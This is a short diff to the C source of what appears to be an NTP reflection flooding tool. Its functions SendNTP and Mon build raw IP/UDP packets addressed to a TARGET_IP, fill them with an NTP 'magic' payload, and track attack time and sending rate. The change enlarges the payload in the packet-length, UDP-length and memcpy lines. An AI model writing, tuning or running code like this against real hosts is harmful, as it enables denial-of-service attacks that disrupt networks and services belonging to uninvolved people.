@@ -206,7 +206,7 @@ void* SendNTP(void* args)
    cliaddr.sin_addr.s_addr = inet_addr(TARGET_IP);
 
   /*数据报的长度NTP*/
-  double pack_len = sizeof(struct ip) + sizeof(struct udphdr) + 8 * sizeof(UCHAR);
+  double pack_len = sizeof(struct ip) + sizeof(struct udphdr) + 64 * sizeof(UCHAR);
 
   char buffer[500];
   struct ip *ipp;
@@ -231,12 +231,12 @@ void* SendNTP(void* args)
   udp = (struct udphdr*)(buffer + sizeof(struct ip));
   udp->uh_sport = cliaddr.sin_port;
   udp->uh_dport = servaddr.sin_port;
-  udp->uh_ulen = htons(sizeof(struct udphdr) + 8 * sizeof(UCHAR)) ;
+  udp->uh_ulen = htons(sizeof(struct udphdr) + 64 * sizeof(UCHAR)) ;
   //udp->uh_sum = 0;
   udp->uh_sum=check_sum((unsigned short *)udp,sizeof(struct udphdr));
 
   //填充NTP头
-  memcpy(buffer + sizeof(struct ip) + sizeof(struct udphdr) , ntp_magic , 8 * sizeof(UCHAR));
+  memcpy(buffer + sizeof(struct ip) + sizeof(struct udphdr) , ntp_magic , 64 * sizeof(UCHAR));
 
   ALIVE_THREADS++;
   //进入发包循环
@@ -267,7 +267,7 @@ void* Mon(void* args)
   double attack_time;
   double per_second;
   struct timeval start,end;
-  double ntp_buffer_size = sizeof(struct ip) + sizeof(struct udphdr) + 8 * sizeof(UCHAR);
+  double ntp_buffer_size = sizeof(struct ip) + sizeof(struct udphdr) + 64 * sizeof(UCHAR);
   ALIVE_THREADS++;
 
   while(true)
